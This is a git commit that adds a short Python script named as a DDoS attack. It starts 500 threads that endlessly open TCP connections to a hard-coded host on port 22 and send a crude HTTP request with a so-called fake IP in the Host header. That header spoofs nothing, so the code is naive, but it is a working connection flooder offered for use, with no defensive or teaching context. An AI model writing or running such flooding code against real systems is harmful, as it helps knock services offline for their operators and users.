df9a32f3aa1c9dabb3ac6d1b5dcaa5d458ac1a71
Cybergreek021204 <77197355+arpan02122004@users.noreply.github.com>
2022-10-28 08:42:00 +0530

    Addind basic attack script

---
+++ DDOS_Attack script.py
@@ -0,0 +1,20 @@
+import threading
+import socket
+
+target = '10.10.10.2'
+port = 22
+fake_ip = '10.10.224.7'
+
+already_connected = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
